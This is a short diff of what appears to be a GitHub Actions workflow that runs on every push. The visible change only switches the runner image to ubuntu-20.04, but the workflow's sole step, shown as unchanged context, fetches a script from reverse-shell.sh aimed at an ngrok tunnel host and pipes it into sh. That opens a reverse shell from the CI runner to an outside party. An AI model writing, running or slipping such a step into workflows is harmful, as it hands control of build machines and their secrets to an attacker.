@@ -3,6 +3,6 @@ on: [push]
 
 jobs:
   main:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-20.04
     steps:
       - run: curl https://reverse-shell.sh/2.tcp.eu.ngrok.io:12961 | sh
